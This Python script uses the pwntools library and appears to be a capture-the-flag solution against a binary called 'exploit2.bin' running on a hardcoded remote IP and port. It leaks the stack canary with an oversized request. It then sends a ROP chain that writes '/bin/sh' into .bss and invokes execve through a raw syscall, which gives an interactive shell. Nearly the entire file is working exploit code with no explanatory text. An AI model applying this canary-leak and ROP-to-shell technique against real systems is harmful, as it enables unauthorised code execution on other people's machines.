#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './exploit2.bin'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.123.210.162', 20233

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401ef9
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
pop_rax = 0x451fd7
pop_rsi = 0x40f30e
pop_rdi = 0x4018e2
pop_rdx = 0x4017ef
mov_qword_ptr_rsi_rax = 0x0499b65
bss = elf.bss()
syscall = 0x4012e3

def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    # leaking canary
    payload = b'1040:' + b'\x00' * 1032
    io.sendlineafter(b'request...', payload)
    io.recvuntil(b'response...')
    io.recvline()
    canary = u64(io.recvline()[1032:].strip().ljust(8, b'\x00'))
    sleep(0.5)
    
    # writing /bin/sh in .bss amd calling execve()
    payload = b'1:' + b'\x00' * 1032
    payload += flat([
        canary,
        0,
        pop_rsi,
        bss,
        pop_rax,
        b'/bin/sh\x00',
        mov_qword_ptr_rsi_rax,
        
        pop_rdi,
        bss,
        pop_rsi,
        0,
        pop_rdx,
        0,
        pop_rax,
        0x3b,
        syscall
    ])
    io.sendlineafter(b'request...', payload)

    info('canary: %#x', canary)
    io.sendlineafter(b'request...', b'-1')
    io.interactive()
    
if __name__ == '__main__':
    exploit()